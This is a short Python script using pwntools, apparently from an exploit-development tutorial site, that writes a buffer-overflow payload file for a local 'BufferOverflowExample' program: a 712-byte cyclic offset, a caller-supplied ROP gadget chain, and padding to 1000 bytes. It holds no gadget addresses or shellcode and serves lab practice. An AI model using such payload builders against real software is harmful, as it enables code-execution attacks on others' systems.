# tobeatelite.ca

from pwn import *
import subprocess

PAYLOAD_PATH = '../BufferOverflowExample/x64/Release/payload'

def create_payload(chain):
    try: subprocess.run(f'rm {PAYLOAD_PATH}')
    except: pass

    # GADGET CHAIN PROCESSING
    
    gadget_chain = b"".join([p64(x) for x in chain])

    # FULL CHAIN CREATION

    rop_chain = b""
    rop_chain += cyclic(712)                    # OFFSET
    rop_chain += gadget_chain                   # GADGET CHAIN 
    rop_chain += cyclic(1000 - len(rop_chain))  # PAYLOAD CONSISTENCY

    open(PAYLOAD_PATH, 'wb').write(rop_chain)
    log.success(
        f"created payload with length {len(rop_chain)} at {PAYLOAD_PATH}"
    )
